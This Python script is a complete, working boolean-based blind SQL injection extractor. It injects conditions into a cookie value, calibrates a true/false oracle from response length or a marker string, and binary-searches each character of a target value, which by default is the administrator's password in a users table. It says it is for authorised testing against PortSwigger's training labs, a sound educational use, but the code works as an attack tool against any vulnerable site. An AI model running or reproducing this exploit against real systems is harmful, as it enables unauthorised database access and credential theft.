#!/usr/bin/env python3
"""
Boolean-based Blind SQL Injection data extractor.

Extracts a value from a database through a boolean-based blind SQL injection,
one character at a time, using a binary search over ASCII codes.

The vulnerable input here is a COOKIE whose value is concatenated into a SQL
query. The application does not return the query result, but its response
differs depending on whether the injected condition is TRUE or FALSE
(the classic "conditional response" oracle). This script turns that
difference into a yes/no channel and reconstructs the target value.

FOR AUTHORISED TESTING / EDUCATION ONLY.
Built and tested against the PortSwigger Web Security Academy blind SQLi labs.
Do not run this against systems you do not own or do not have explicit
written permission to test.
"""

import argparse
import string
import sys
import requests
import urllib3

# The target often sits behind an intercepting proxy with a self-signed cert,
# so TLS verification is disabled; silence the resulting warning.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def build_cookie_header(inject_name, inject_value, extra_cookies):
    """Build a raw Cookie header string.

    We set the Cookie header manually instead of using requests' cookies={}
    because the injected value contains spaces, quotes and dashes that the
    cookie jar would otherwise mangle.
    """
    parts = [f"{inject_name}={inject_value}"]
    for name, value in extra_cookies.items():
        parts.append(f"{name}={value}")
    return "; ".join(parts)


class Oracle:
    """Sends a single yes/no question and tells whether it was TRUE.

    Truth is decided either by a marker string in the response body
    (--true-string) or, by default, by auto-calibrating the response length
    for a known-true and known-false condition and comparing against the
    midpoint threshold.
    """

    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.extra_cookies = dict(c.split("=", 1) for c in args.cookie)
        self.true_string = args.true_string
        self.threshold = None  # set by calibrate() when using length mode

    def _length_of(self, condition):
        """Send one condition and return the response body length."""
        inject_value = f"{self.args.prefix}{condition}{self.args.suffix}"
        headers = {
            "Cookie": build_cookie_header(
                self.args.inject_cookie, inject_value, self.extra_cookies
            )
        }
        resp = self.session.get(
            self.args.url,
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=self.args.timeout,
        )
        return resp

    def calibrate(self):
        """Measure a known-true vs known-false response to build the oracle."""
        true_resp = self._length_of(self.args.true_condition)
        false_resp = self._length_of(self.args.false_condition)

        if self.true_string:
            # Marker mode: confirm the marker appears only in the true case.
            t = self.true_string in true_resp.text
            f = self.true_string in false_resp.text
            print(f"[calib] true_marker={t} false_marker={f} (string mode)")
            if not (t and not f):
                sys.exit("!! Marker does not distinguish true/false. "
                         "Check --true-string / cookies.")
        else:
            # Length mode: midpoint between the two lengths is the threshold.
            t_len, f_len = len(true_resp.text), len(false_resp.text)
            self.threshold = (t_len + f_len) // 2
            print(f"[calib] true_len={t_len} false_len={f_len} "
                  f"threshold={self.threshold} (length mode)")
            if t_len == f_len:
                sys.exit("!! True and false lengths are equal. The oracle "
                         "does not work. Check cookies / injection point.")

    def is_true(self, condition):
        """Return True if the injected condition evaluated to TRUE."""
        resp = self._length_of(condition)
        if self.true_string:
            return self.true_string in resp.text
        return len(resp.text) > self.threshold


def find_length(oracle, query, max_len):
    """Binary-search the length of the value returned by `query`."""
    low, high = 0, max_len
    while low < high:
        mid = (low + high) // 2
        # "is the value longer than mid characters?"
        cond = f"LENGTH(({query})) > {mid}"
        if oracle.is_true(cond):
            low = mid + 1
        else:
            high = mid
    return low


def extract(oracle, query, length, lo_code, hi_code):
    """Extract the value character by character using a binary search per char."""
    value = ""
    for pos in range(1, length + 1):
        low, high = lo_code, hi_code
        while low < high:
            mid = (low + high) // 2
            # "is the ASCII code of this character greater than mid?"
            cond = f"ASCII(SUBSTRING(({query}),{pos},1)) > {mid}"
            if oracle.is_true(cond):
                low = mid + 1
            else:
                high = mid
        ch = chr(low)
        value += ch
        print(f"[+] char {pos:>2}: '{ch}'   ->   {value}")
    return value


def parse_args():
    p = argparse.ArgumentParser(
        description="Boolean-based blind SQL injection data extractor "
                    "(cookie injection point).",
        epilog="Authorised testing / education only.",
    )
    p.add_argument("-u", "--url", required=True,
                   help="Target URL that reflects the oracle "
                        "(e.g. https://host/filter?category=Gifts)")
    p.add_argument("--inject-cookie", default="TrackingId",
                   help="Name of the injectable cookie (default: TrackingId)")
    p.add_argument("-c", "--cookie", action="append", default=[],
                   metavar="name=value",
                   help="Extra cookie to send unchanged, e.g. "
                        "session=abc123 (repeatable)")
    p.add_argument("--prefix", default="",
                   help="Text placed before the injected condition. Usually "
                        "left empty: prefer --seed, which builds the breakout "
                        "for you. Use --prefix only to craft a custom breakout "
                        "by hand, e.g. \"someid' AND \".")
    p.add_argument("--seed", default="",
                   help="Known valid value of the injectable cookie (e.g. the "
                        "real TrackingId). The breakout quote and AND are added "
                        "automatically.")
    p.add_argument("--suffix", default="--",
                   help="Text placed after the condition to comment out the "
                        "rest of the query (default: --)")
    p.add_argument("-q", "--query",
                   default="SELECT password FROM users "
                           "WHERE username='administrator'",
                   help="Sub-query whose single value is extracted.")
    p.add_argument("--length", type=int, default=0,
                   help="Known length of the value. 0 = auto-detect "
                        "(default: 0).")
    p.add_argument("--max-length", type=int, default=64,
                   help="Upper bound used when auto-detecting length "
                        "(default: 64).")
    p.add_argument("--true-condition", default="1=1",
                   help="A condition that is always true, for calibration "
                        "(default: 1=1).")
    p.add_argument("--false-condition", default="1=2",
                   help="A condition that is always false, for calibration "
                        "(default: 1=2).")
    p.add_argument("--true-string", default=None,
                   help="If set, truth is decided by this marker string in the "
                        "response body (e.g. 'Welcome back') instead of by "
                        "response length.")
    p.add_argument("--min-code", type=int, default=32,
                   help="Lowest ASCII code to search (default: 32).")
    p.add_argument("--max-code", type=int, default=126,
                   help="Highest ASCII code to search (default: 126).")
    p.add_argument("--timeout", type=float, default=15.0,
                   help="Per-request timeout in seconds (default: 15).")

    args = p.parse_args()

    # Compose the final prefix. If --seed is given, build "<seed>' AND "
    # automatically so the user does not have to craft the breakout by hand.
    if args.seed and not args.prefix:
        args.prefix = f"{args.seed}' AND "
    return args


def main():
    args = parse_args()
    oracle = Oracle(args)

    print("[*] Calibrating oracle...")
    oracle.calibrate()

    length = args.length
    if length <= 0:
        print("[*] Auto-detecting value length...")
        length = find_length(oracle, args.query, args.max_length)
        print(f"[*] Length = {length}")

    print("[*] Extracting value...")
    value = extract(oracle, args.query, length, args.min_code, args.max_code)
    print(f"\n[*] DONE. Extracted value = {value}")


if __name__ == "__main__":
    main()
